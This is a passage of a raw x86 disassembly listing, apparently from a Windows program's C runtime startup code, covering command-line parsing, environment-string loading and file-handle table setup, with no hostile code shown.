  403f1a:	89 01                	mov    %eax,(%ecx)
  403f1c:	eb cc                	jmp    0x403eea
  403f1e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403f21:	0f be 02             	movsbl (%edx),%eax
  403f24:	85 c0                	test   %eax,%eax
  403f26:	74 1c                	je     0x403f44
  403f28:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  403f2c:	75 1b                	jne    0x403f49
  403f2e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403f31:	0f be 11             	movsbl (%ecx),%edx
  403f34:	83 fa 20             	cmp    $0x20,%edx
  403f37:	74 0b                	je     0x403f44
  403f39:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403f3c:	0f be 08             	movsbl (%eax),%ecx
  403f3f:	83 f9 09             	cmp    $0x9,%ecx
  403f42:	75 05                	jne    0x403f49
  403f44:	e9 ab 00 00 00       	jmp    0x403ff4
  403f49:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  403f4d:	0f 84 93 00 00 00    	je     0x403fe6
  403f53:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403f57:	74 54                	je     0x403fad
  403f59:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403f5c:	33 c0                	xor    %eax,%eax
  403f5e:	8a 02                	mov    (%edx),%al
  403f60:	33 c9                	xor    %ecx,%ecx
  403f62:	8a 88 41 39 42 00    	mov    0x423941(%eax),%cl
  403f68:	83 e1 04             	and    $0x4,%ecx
  403f6b:	85 c9                	test   %ecx,%ecx
  403f6d:	74 29                	je     0x403f98
  403f6f:	8b 55 10             	mov    0x10(%ebp),%edx
  403f72:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403f75:	8a 08                	mov    (%eax),%cl
  403f77:	88 0a                	mov    %cl,(%edx)
  403f79:	8b 55 10             	mov    0x10(%ebp),%edx
  403f7c:	83 c2 01             	add    $0x1,%edx
  403f7f:	89 55 10             	mov    %edx,0x10(%ebp)
  403f82:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403f85:	83 c0 01             	add    $0x1,%eax
  403f88:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403f8b:	8b 4d 18             	mov    0x18(%ebp),%ecx
  403f8e:	8b 11                	mov    (%ecx),%edx
  403f90:	83 c2 01             	add    $0x1,%edx
  403f93:	8b 45 18             	mov    0x18(%ebp),%eax
  403f96:	89 10                	mov    %edx,(%eax)
  403f98:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403f9b:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403f9e:	8a 02                	mov    (%edx),%al
  403fa0:	88 01                	mov    %al,(%ecx)
  403fa2:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403fa5:	83 c1 01             	add    $0x1,%ecx
  403fa8:	89 4d 10             	mov    %ecx,0x10(%ebp)
  403fab:	eb 2c                	jmp    0x403fd9
  403fad:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403fb0:	33 c0                	xor    %eax,%eax
  403fb2:	8a 02                	mov    (%edx),%al
  403fb4:	33 c9                	xor    %ecx,%ecx
  403fb6:	8a 88 41 39 42 00    	mov    0x423941(%eax),%cl
  403fbc:	83 e1 04             	and    $0x4,%ecx
  403fbf:	85 c9                	test   %ecx,%ecx
  403fc1:	74 16                	je     0x403fd9
  403fc3:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403fc6:	83 c2 01             	add    $0x1,%edx
  403fc9:	89 55 fc             	mov    %edx,-0x4(%ebp)
  403fcc:	8b 45 18             	mov    0x18(%ebp),%eax
  403fcf:	8b 08                	mov    (%eax),%ecx
  403fd1:	83 c1 01             	add    $0x1,%ecx
  403fd4:	8b 55 18             	mov    0x18(%ebp),%edx
  403fd7:	89 0a                	mov    %ecx,(%edx)
  403fd9:	8b 45 18             	mov    0x18(%ebp),%eax
  403fdc:	8b 08                	mov    (%eax),%ecx
  403fde:	83 c1 01             	add    $0x1,%ecx
  403fe1:	8b 55 18             	mov    0x18(%ebp),%edx
  403fe4:	89 0a                	mov    %ecx,(%edx)
  403fe6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403fe9:	83 c0 01             	add    $0x1,%eax
  403fec:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403fef:	e9 6d fe ff ff       	jmp    0x403e61
  403ff4:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403ff8:	74 0f                	je     0x404009
  403ffa:	8b 4d 10             	mov    0x10(%ebp),%ecx
  403ffd:	c6 01 00             	movb   $0x0,(%ecx)
  404000:	8b 55 10             	mov    0x10(%ebp),%edx
  404003:	83 c2 01             	add    $0x1,%edx
  404006:	89 55 10             	mov    %edx,0x10(%ebp)
  404009:	8b 45 18             	mov    0x18(%ebp),%eax
  40400c:	8b 08                	mov    (%eax),%ecx
  40400e:	83 c1 01             	add    $0x1,%ecx
  404011:	8b 55 18             	mov    0x18(%ebp),%edx
  404014:	89 0a                	mov    %ecx,(%edx)
  404016:	e9 e8 fd ff ff       	jmp    0x403e03
  40401b:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40401f:	74 12                	je     0x404033
  404021:	8b 45 0c             	mov    0xc(%ebp),%eax
  404024:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  40402a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40402d:	83 c1 04             	add    $0x4,%ecx
  404030:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  404033:	8b 55 14             	mov    0x14(%ebp),%edx
  404036:	8b 02                	mov    (%edx),%eax
  404038:	83 c0 01             	add    $0x1,%eax
  40403b:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40403e:	89 01                	mov    %eax,(%ecx)
  404040:	8b e5                	mov    %ebp,%esp
  404042:	5d                   	pop    %ebp
  404043:	c3                   	ret    
  404044:	cc                   	int3   
  404045:	cc                   	int3   
  404046:	cc                   	int3   
  404047:	cc                   	int3   
  404048:	cc                   	int3   
  404049:	cc                   	int3   
  40404a:	cc                   	int3   
  40404b:	cc                   	int3   
  40404c:	cc                   	int3   
  40404d:	cc                   	int3   
  40404e:	cc                   	int3   
  40404f:	cc                   	int3   
  404050:	55                   	push   %ebp
  404051:	8b ec                	mov    %esp,%ebp
  404053:	83 ec 18             	sub    $0x18,%esp
  404056:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  40405d:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  404064:	83 3d 24 37 42 00 00 	cmpl   $0x0,0x423724
  40406b:	75 3d                	jne    0x4040aa
  40406d:	ff 15 d8 51 42 00    	call   *0x4251d8
  404073:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404076:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  40407a:	74 0c                	je     0x404088
  40407c:	c7 05 24 37 42 00 01 	movl   $0x1,0x423724
  404083:	00 00 00 
  404086:	eb 22                	jmp    0x4040aa
  404088:	ff 15 d4 51 42 00    	call   *0x4251d4
  40408e:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404091:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  404095:	74 0c                	je     0x4040a3
  404097:	c7 05 24 37 42 00 02 	movl   $0x2,0x423724
  40409e:	00 00 00 
  4040a1:	eb 07                	jmp    0x4040aa
  4040a3:	33 c0                	xor    %eax,%eax
  4040a5:	e9 bb 01 00 00       	jmp    0x404265
  4040aa:	83 3d 24 37 42 00 01 	cmpl   $0x1,0x423724
  4040b1:	0f 85 f7 00 00 00    	jne    0x4041ae
  4040b7:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  4040bb:	75 16                	jne    0x4040d3
  4040bd:	ff 15 d8 51 42 00    	call   *0x4251d8
  4040c3:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4040c6:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  4040ca:	75 07                	jne    0x4040d3
  4040cc:	33 c0                	xor    %eax,%eax
  4040ce:	e9 92 01 00 00       	jmp    0x404265
  4040d3:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4040d6:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4040d9:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4040dc:	33 d2                	xor    %edx,%edx
  4040de:	66 8b 11             	mov    (%ecx),%dx
  4040e1:	85 d2                	test   %edx,%edx
  4040e3:	74 20                	je     0x404105
  4040e5:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4040e8:	83 c0 02             	add    $0x2,%eax
  4040eb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4040ee:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4040f1:	33 d2                	xor    %edx,%edx
  4040f3:	66 8b 11             	mov    (%ecx),%dx
  4040f6:	85 d2                	test   %edx,%edx
  4040f8:	75 09                	jne    0x404103
  4040fa:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4040fd:	83 c0 02             	add    $0x2,%eax
  404100:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404103:	eb d4                	jmp    0x4040d9
  404105:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  404108:	2b 4d ec             	sub    -0x14(%ebp),%ecx
  40410b:	d1 f9                	sar    %ecx
  40410d:	83 c1 01             	add    $0x1,%ecx
  404110:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404113:	6a 00                	push   $0x0
  404115:	6a 00                	push   $0x0
  404117:	6a 00                	push   $0x0
  404119:	6a 00                	push   $0x0
  40411b:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40411e:	52                   	push   %edx
  40411f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404122:	50                   	push   %eax
  404123:	6a 00                	push   $0x0
  404125:	6a 00                	push   $0x0
  404127:	ff 15 d0 51 42 00    	call   *0x4251d0
  40412d:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404130:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  404134:	74 1e                	je     0x404154
  404136:	6a 64                	push   $0x64
  404138:	68 3c 05 42 00       	push   $0x42053c
  40413d:	6a 02                	push   $0x2
  40413f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404142:	51                   	push   %ecx
  404143:	e8 d8 09 00 00       	call   0x404b20
  404148:	83 c4 10             	add    $0x10,%esp
  40414b:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40414e:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  404152:	75 11                	jne    0x404165
  404154:	8b 55 ec             	mov    -0x14(%ebp),%edx
  404157:	52                   	push   %edx
  404158:	ff 15 cc 51 42 00    	call   *0x4251cc
  40415e:	33 c0                	xor    %eax,%eax
  404160:	e9 00 01 00 00       	jmp    0x404265
  404165:	6a 00                	push   $0x0
  404167:	6a 00                	push   $0x0
  404169:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40416c:	50                   	push   %eax
  40416d:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404170:	51                   	push   %ecx
  404171:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404174:	52                   	push   %edx
  404175:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404178:	50                   	push   %eax
  404179:	6a 00                	push   $0x0
  40417b:	6a 00                	push   $0x0
  40417d:	ff 15 d0 51 42 00    	call   *0x4251d0
  404183:	85 c0                	test   %eax,%eax
  404185:	75 15                	jne    0x40419c
  404187:	6a 02                	push   $0x2
  404189:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  40418c:	51                   	push   %ecx
  40418d:	e8 ce 13 00 00       	call   0x405560
  404192:	83 c4 08             	add    $0x8,%esp
  404195:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  40419c:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40419f:	52                   	push   %edx
  4041a0:	ff 15 cc 51 42 00    	call   *0x4251cc
  4041a6:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4041a9:	e9 b7 00 00 00       	jmp    0x404265
  4041ae:	83 3d 24 37 42 00 02 	cmpl   $0x2,0x423724
  4041b5:	0f 85 a8 00 00 00    	jne    0x404263
  4041bb:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  4041bf:	75 16                	jne    0x4041d7
  4041c1:	ff 15 d4 51 42 00    	call   *0x4251d4
  4041c7:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4041ca:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  4041ce:	75 07                	jne    0x4041d7
  4041d0:	33 c0                	xor    %eax,%eax
  4041d2:	e9 8e 00 00 00       	jmp    0x404265
  4041d7:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4041da:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4041dd:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4041e0:	0f be 11             	movsbl (%ecx),%edx
  4041e3:	85 d2                	test   %edx,%edx
  4041e5:	74 1e                	je     0x404205
  4041e7:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4041ea:	83 c0 01             	add    $0x1,%eax
  4041ed:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4041f0:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4041f3:	0f be 11             	movsbl (%ecx),%edx
  4041f6:	85 d2                	test   %edx,%edx
  4041f8:	75 09                	jne    0x404203
  4041fa:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4041fd:	83 c0 01             	add    $0x1,%eax
  404200:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404203:	eb d8                	jmp    0x4041dd
  404205:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  404208:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  40420b:	83 c1 01             	add    $0x1,%ecx
  40420e:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  404211:	68 8f 00 00 00       	push   $0x8f
  404216:	68 3c 05 42 00       	push   $0x42053c
  40421b:	6a 02                	push   $0x2
  40421d:	8b 55 f0             	mov    -0x10(%ebp),%edx
  404220:	52                   	push   %edx
  404221:	e8 fa 08 00 00       	call   0x404b20
  404226:	83 c4 10             	add    $0x10,%esp
  404229:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40422c:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  404230:	75 0e                	jne    0x404240
  404232:	8b 45 e8             	mov    -0x18(%ebp),%eax
  404235:	50                   	push   %eax
  404236:	ff 15 c8 51 42 00    	call   *0x4251c8
  40423c:	33 c0                	xor    %eax,%eax
  40423e:	eb 25                	jmp    0x404265
  404240:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404243:	51                   	push   %ecx
  404244:	8b 55 e8             	mov    -0x18(%ebp),%edx
  404247:	52                   	push   %edx
  404248:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40424b:	50                   	push   %eax
  40424c:	e8 2f 3c 00 00       	call   0x407e80
  404251:	83 c4 0c             	add    $0xc,%esp
  404254:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  404257:	51                   	push   %ecx
  404258:	ff 15 c8 51 42 00    	call   *0x4251c8
  40425e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404261:	eb 02                	jmp    0x404265
  404263:	33 c0                	xor    %eax,%eax
  404265:	8b e5                	mov    %ebp,%esp
  404267:	5d                   	pop    %ebp
  404268:	c3                   	ret    
  404269:	cc                   	int3   
  40426a:	cc                   	int3   
  40426b:	cc                   	int3   
  40426c:	cc                   	int3   
  40426d:	cc                   	int3   
  40426e:	cc                   	int3   
  40426f:	cc                   	int3   
  404270:	55                   	push   %ebp
  404271:	8b ec                	mov    %esp,%ebp
  404273:	83 ec 6c             	sub    $0x6c,%esp
  404276:	68 81 00 00 00       	push   $0x81
  40427b:	68 44 05 42 00       	push   $0x420544
  404280:	6a 02                	push   $0x2
  404282:	68 00 01 00 00       	push   $0x100
  404287:	e8 94 08 00 00       	call   0x404b20
  40428c:	83 c4 10             	add    $0x10,%esp
  40428f:	89 45 b0             	mov    %eax,-0x50(%ebp)
  404292:	83 7d b0 00          	cmpl   $0x0,-0x50(%ebp)
  404296:	75 0a                	jne    0x4042a2
  404298:	6a 1b                	push   $0x1b
  40429a:	e8 31 d4 ff ff       	call   0x4016d0
  40429f:	83 c4 04             	add    $0x4,%esp
  4042a2:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4042a5:	a3 60 3a 42 00       	mov    %eax,0x423a60
  4042aa:	c7 05 9c 3b 42 00 20 	movl   $0x20,0x423b9c
  4042b1:	00 00 00 
  4042b4:	eb 09                	jmp    0x4042bf
  4042b6:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  4042b9:	83 c1 08             	add    $0x8,%ecx
  4042bc:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  4042bf:	8b 15 60 3a 42 00    	mov    0x423a60,%edx
  4042c5:	81 c2 00 01 00 00    	add    $0x100,%edx
  4042cb:	39 55 b0             	cmp    %edx,-0x50(%ebp)
  4042ce:	73 19                	jae    0x4042e9
  4042d0:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4042d3:	c6 40 04 00          	movb   $0x0,0x4(%eax)
  4042d7:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  4042da:	c7 01 ff ff ff ff    	movl   $0xffffffff,(%ecx)
  4042e0:	8b 55 b0             	mov    -0x50(%ebp),%edx
  4042e3:	c6 42 05 0a          	movb   $0xa,0x5(%edx)
  4042e7:	eb cd                	jmp    0x4042b6
  4042e9:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4042ec:	50                   	push   %eax
  4042ed:	ff 15 e4 51 42 00    	call   *0x4251e4
  4042f3:	8b 4d ea             	mov    -0x16(%ebp),%ecx
  4042f6:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  4042fc:	85 c9                	test   %ecx,%ecx
  4042fe:	0f 84 7a 01 00 00    	je     0x40447e
  404304:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  404308:	0f 84 70 01 00 00    	je     0x40447e
  40430e:	8b 55 ec             	mov    -0x14(%ebp),%edx
  404311:	8b 02                	mov    (%edx),%eax
  404313:	89 45 9c             	mov    %eax,-0x64(%ebp)
  404316:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  404319:	83 c1 04             	add    $0x4,%ecx
  40431c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40431f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404322:	03 55 9c             	add    -0x64(%ebp),%edx
  404325:	89 55 a0             	mov    %edx,-0x60(%ebp)
  404328:	81 7d 9c 00 08 00 00 	cmpl   $0x800,-0x64(%ebp)
  40432f:	7d 08                	jge    0x404339
  404331:	8b 45 9c             	mov    -0x64(%ebp),%eax
  404334:	89 45 98             	mov    %eax,-0x68(%ebp)
  404337:	eb 07                	jmp    0x404340
  404339:	c7 45 98 00 08 00 00 	movl   $0x800,-0x68(%ebp)
  404340:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  404343:	89 4d 9c             	mov    %ecx,-0x64(%ebp)
  404346:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  40434d:	eb 09                	jmp    0x404358
  40434f:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  404352:	83 c2 01             	add    $0x1,%edx
  404355:	89 55 a4             	mov    %edx,-0x5c(%ebp)
  404358:	a1 9c 3b 42 00       	mov    0x423b9c,%eax
  40435d:	3b 45 9c             	cmp    -0x64(%ebp),%eax
  404360:	0f 8d 87 00 00 00    	jge    0x4043ed
  404366:	68 b6 00 00 00       	push   $0xb6
  40436b:	68 44 05 42 00       	push   $0x420544
  404370:	6a 02                	push   $0x2
  404372:	68 00 01 00 00       	push   $0x100
  404377:	e8 a4 07 00 00       	call   0x404b20
  40437c:	83 c4 10             	add    $0x10,%esp
  40437f:	89 45 b0             	mov    %eax,-0x50(%ebp)
  404382:	83 7d b0 00          	cmpl   $0x0,-0x50(%ebp)
  404386:	75 0b                	jne    0x404393
  404388:	8b 0d 9c 3b 42 00    	mov    0x423b9c,%ecx
  40438e:	89 4d 9c             	mov    %ecx,-0x64(%ebp)
  404391:	eb 5a                	jmp    0x4043ed
  404393:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  404396:	8b 45 b0             	mov    -0x50(%ebp),%eax
  404399:	89 04 95 60 3a 42 00 	mov    %eax,0x423a60(,%edx,4)
  4043a0:	8b 0d 9c 3b 42 00    	mov    0x423b9c,%ecx
  4043a6:	83 c1 20             	add    $0x20,%ecx
  4043a9:	89 0d 9c 3b 42 00    	mov    %ecx,0x423b9c
  4043af:	eb 09                	jmp    0x4043ba
  4043b1:	8b 55 b0             	mov    -0x50(%ebp),%edx
  4043b4:	83 c2 08             	add    $0x8,%edx
  4043b7:	89 55 b0             	mov    %edx,-0x50(%ebp)
  4043ba:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  4043bd:	8b 0c 85 60 3a 42 00 	mov    0x423a60(,%eax,4),%ecx
  4043c4:	81 c1 00 01 00 00    	add    $0x100,%ecx
  4043ca:	39 4d b0             	cmp    %ecx,-0x50(%ebp)
  4043cd:	73 19                	jae    0x4043e8
  4043cf:	8b 55 b0             	mov    -0x50(%ebp),%edx
  4043d2:	c6 42 04 00          	movb   $0x0,0x4(%edx)
  4043d6:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4043d9:	c7 00 ff ff ff ff    	movl   $0xffffffff,(%eax)
  4043df:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  4043e2:	c6 41 05 0a          	movb   $0xa,0x5(%ecx)
  4043e6:	eb c9                	jmp    0x4043b1
  4043e8:	e9 62 ff ff ff       	jmp    0x40434f
  4043ed:	c7 45 a8 00 00 00 00 	movl   $0x0,-0x58(%ebp)
  4043f4:	eb 1b                	jmp    0x404411
  4043f6:	8b 55 a8             	mov    -0x58(%ebp),%edx
  4043f9:	83 c2 01             	add    $0x1,%edx
  4043fc:	89 55 a8             	mov    %edx,-0x58(%ebp)
  4043ff:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404402:	83 c0 01             	add    $0x1,%eax
  404405:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404408:	8b 4d a0             	mov    -0x60(%ebp),%ecx
  40440b:	83 c1 04             	add    $0x4,%ecx
  40440e:	89 4d a0             	mov    %ecx,-0x60(%ebp)
  404411:	8b 55 a8             	mov    -0x58(%ebp),%edx
  404414:	3b 55 9c             	cmp    -0x64(%ebp),%edx
  404417:	7d 65                	jge    0x40447e
  404419:	8b 45 a0             	mov    -0x60(%ebp),%eax
  40441c:	83 38 ff             	cmpl   $0xffffffff,(%eax)
  40441f:	74 58                	je     0x404479
  404421:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404424:	0f be 11             	movsbl (%ecx),%edx
  404427:	83 e2 01             	and    $0x1,%edx
  40442a:	85 d2                	test   %edx,%edx
  40442c:	74 4b                	je     0x404479
  40442e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404431:	0f be 08             	movsbl (%eax),%ecx
  404434:	83 e1 08             	and    $0x8,%ecx
  404437:	85 c9                	test   %ecx,%ecx
  404439:	75 10                	jne    0x40444b
  40443b:	8b 55 a0             	mov    -0x60(%ebp),%edx
  40443e:	8b 02                	mov    (%edx),%eax
  404440:	50                   	push   %eax
  404441:	ff 15 e0 51 42 00    	call   *0x4251e0
  404447:	85 c0                	test   %eax,%eax
  404449:	74 2e                	je     0x404479
  40444b:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  40444e:	c1 f9 05             	sar    $0x5,%ecx
  404451:	8b 55 a8             	mov    -0x58(%ebp),%edx
  404454:	83 e2 1f             	and    $0x1f,%edx
  404457:	8b 04 8d 60 3a 42 00 	mov    0x423a60(,%ecx,4),%eax
  40445e:	8d 0c d0             	lea    (%eax,%edx,8),%ecx
  404461:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  404464:	8b 55 b0             	mov    -0x50(%ebp),%edx
  404467:	8b 45 a0             	mov    -0x60(%ebp),%eax
  40446a:	8b 08                	mov    (%eax),%ecx
  40446c:	89 0a                	mov    %ecx,(%edx)
  40446e:	8b 55 b0             	mov    -0x50(%ebp),%edx
  404471:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404474:	8a 08                	mov    (%eax),%cl
  404476:	88 4a 04             	mov    %cl,0x4(%edx)
  404479:	e9 78 ff ff ff       	jmp    0x4043f6
  40447e:	c7 45 a8 00 00 00 00 	movl   $0x0,-0x58(%ebp)
  404485:	eb 09                	jmp    0x404490
  404487:	8b 55 a8             	mov    -0x58(%ebp),%edx
  40448a:	83 c2 01             	add    $0x1,%edx
  40448d:	89 55 a8             	mov    %edx,-0x58(%ebp)
  404490:	83 7d a8 03          	cmpl   $0x3,-0x58(%ebp)
  404494:	0f 8d d1 00 00 00    	jge    0x40456b
  40449a:	8b 45 a8             	mov    -0x58(%ebp),%eax
  40449d:	8b 0d 60 3a 42 00    	mov    0x423a60,%ecx
  4044a3:	8d 14 c1             	lea    (%ecx,%eax,8),%edx
  4044a6:	89 55 b0             	mov    %edx,-0x50(%ebp)
  4044a9:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4044ac:	83 38 ff             	cmpl   $0xffffffff,(%eax)
  4044af:	0f 85 a2 00 00 00    	jne    0x404557
  4044b5:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  4044b8:	c6 41 04 81          	movb   $0x81,0x4(%ecx)
  4044bc:	83 7d a8 00          	cmpl   $0x0,-0x58(%ebp)
  4044c0:	75 09                	jne    0x4044cb
  4044c2:	c7 45 94 f6 ff ff ff 	movl   $0xfffffff6,-0x6c(%ebp)
  4044c9:	eb 10                	jmp    0x4044db
  4044cb:	8b 55 a8             	mov    -0x58(%ebp),%edx
  4044ce:	83 ea 01             	sub    $0x1,%edx
  4044d1:	f7 da                	neg    %edx
  4044d3:	1b d2                	sbb    %edx,%edx
  4044d5:	83 c2 f5             	add    $0xfffffff5,%edx
  4044d8:	89 55 94             	mov    %edx,-0x6c(%ebp)
  4044db:	8b 45 94             	mov    -0x6c(%ebp),%eax
  4044de:	50                   	push   %eax
  4044df:	ff 15 9c 51 42 00    	call   *0x42519c
  4044e5:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4044e8:	83 7d b4 ff          	cmpl   $0xffffffff,-0x4c(%ebp)
  4044ec:	74 58                	je     0x404546
  4044ee:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  4044f1:	51                   	push   %ecx
  4044f2:	ff 15 e0 51 42 00    	call   *0x4251e0
  4044f8:	89 45 ac             	mov    %eax,-0x54(%ebp)
  4044fb:	83 7d ac 00          	cmpl   $0x0,-0x54(%ebp)
  4044ff:	74 45                	je     0x404546
  404501:	8b 55 b0             	mov    -0x50(%ebp),%edx
  404504:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  404507:	89 02                	mov    %eax,(%edx)
  404509:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  40450c:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  404512:	83 f9 02             	cmp    $0x2,%ecx
  404515:	75 10                	jne    0x404527
  404517:	8b 55 b0             	mov    -0x50(%ebp),%edx
  40451a:	8a 42 04             	mov    0x4(%edx),%al
  40451d:	0c 40                	or     $0x40,%al
  40451f:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  404522:	88 41 04             	mov    %al,0x4(%ecx)
  404525:	eb 1d                	jmp    0x404544
  404527:	8b 55 ac             	mov    -0x54(%ebp),%edx
  40452a:	81 e2 ff 00 00 00    	and    $0xff,%edx
  404530:	83 fa 03             	cmp    $0x3,%edx
  404533:	75 0f                	jne    0x404544
  404535:	8b 45 b0             	mov    -0x50(%ebp),%eax
  404538:	8a 48 04             	mov    0x4(%eax),%cl
  40453b:	80 c9 08             	or     $0x8,%cl
  40453e:	8b 55 b0             	mov    -0x50(%ebp),%edx
  404541:	88 4a 04             	mov    %cl,0x4(%edx)
  404544:	eb 0f                	jmp    0x404555
  404546:	8b 45 b0             	mov    -0x50(%ebp),%eax
  404549:	8a 48 04             	mov    0x4(%eax),%cl
  40454c:	80 c9 40             	or     $0x40,%cl
  40454f:	8b 55 b0             	mov    -0x50(%ebp),%edx
  404552:	88 4a 04             	mov    %cl,0x4(%edx)
  404555:	eb 0f                	jmp    0x404566
  404557:	8b 45 b0             	mov    -0x50(%ebp),%eax
  40455a:	8a 48 04             	mov    0x4(%eax),%cl
  40455d:	80 c9 80             	or     $0x80,%cl
  404560:	8b 55 b0             	mov    -0x50(%ebp),%edx
  404563:	88 4a 04             	mov    %cl,0x4(%edx)
  404566:	e9 1c ff ff ff       	jmp    0x404487
  40456b:	a1 9c 3b 42 00       	mov    0x423b9c,%eax
  404570:	50                   	push   %eax
  404571:	ff 15 dc 51 42 00    	call   *0x4251dc
  404577:	8b e5                	mov    %ebp,%esp
  404579:	5d                   	pop    %ebp
  40457a:	c3                   	ret    
  40457b:	cc                   	int3   
  40457c:	cc                   	int3   
  40457d:	cc                   	int3   
  40457e:	cc                   	int3   
  40457f:	cc                   	int3   
  404580:	55                   	push   %ebp
  404581:	8b ec                	mov    %esp,%ebp
  404583:	51                   	push   %ecx
  404584:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40458b:	eb 09                	jmp    0x404596
  40458d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404590:	83 c0 01             	add    $0x1,%eax
  404593:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404596:	83 7d fc 40          	cmpl   $0x40,-0x4(%ebp)
  40459a:	7d 32                	jge    0x4045ce
  40459c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40459f:	83 3c 8d 60 3a 42 00 	cmpl   $0x0,0x423a60(,%ecx,4)
  4045a6:	00 
  4045a7:	74 23                	je     0x4045cc
